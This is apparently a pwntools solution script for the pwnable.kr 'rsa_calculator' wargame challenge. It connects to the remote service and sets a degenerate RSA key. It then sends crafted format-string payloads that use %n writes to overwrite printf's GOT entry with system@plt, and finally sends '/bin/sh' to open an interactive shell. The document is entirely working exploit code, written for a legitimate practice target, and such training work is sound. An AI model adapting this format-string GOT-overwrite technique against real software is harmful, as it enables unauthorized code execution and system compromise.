from pwn import *

context(log_level="debug", arch="amd64", os="linux")
# r = process("./rsa_calculator")
r = remote("pwnable.kr", 9012)
binary = ELF("./rsa_calculator")

printf_got = binary.got["printf"]
system_plt = binary.plt["system"]  # 0x4007c0: system@plt


def encrypt(s: str) -> bytes:
    res = []
    for i in s:
        res.append(format(ord(i), "0x").ljust(8, "0"))
    return "".join(res).encode("utf-8")


def recvmenu():
    r.recvuntil(b"exit\n")


def decrypt(msg: bytes):
    recvmenu()
    r.sendline(b"3")
    r.recvuntil(b" : ")
    r.sendline(b"-1")
    r.recvuntil(b"\n")
    r.sendline(msg)


def set_key(p: int, q: int, e: int, d: int):
    recvmenu()
    r.sendline(b"1")
    r.recvuntil(b"p : ")
    r.sendline(str(p).encode("utf-8"))
    r.recvuntil(b"q : ")
    r.sendline(str(q).encode("utf-8"))
    r.recvuntil(b"e : ")
    r.sendline(str(e).encode("utf-8"))
    r.recvuntil(b"d : ")
    r.sendline(str(d).encode("utf-8"))


set_key(100, 100, 1, 1)
decrypt(encrypt("a" * 40) + p64(printf_got + 4) + p64(printf_got + 2) + p64(printf_got))
decrypt(encrypt("%52$n%64c%53$hn%1920c%54$hn"))
recvmenu()
r.recvline()
r.sendline(b"3")
r.sendline(b"-1")
r.recvuntil(b"\n")
r.sendline(encrypt("/bin/sh"))
r.interactive()
